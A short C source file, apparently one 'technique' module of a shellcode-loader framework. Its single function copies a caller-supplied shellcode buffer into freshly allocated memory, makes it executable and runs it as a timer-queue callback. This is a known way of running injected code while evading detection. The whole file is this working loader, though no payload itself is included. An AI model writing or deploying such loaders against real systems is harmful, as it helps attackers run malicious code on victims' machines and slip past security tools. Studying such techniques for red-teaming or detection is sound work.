#include "../dispatch.h"

BOOL tech_timer_queue(unsigned char *sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    HANDLE hTimer = NULL;
    CreateTimerQueueTimer(&hTimer, NULL,
                          (WAITORTIMERCALLBACK)mem,
                          NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(hEvent, INFINITE);
    return TRUE;
}
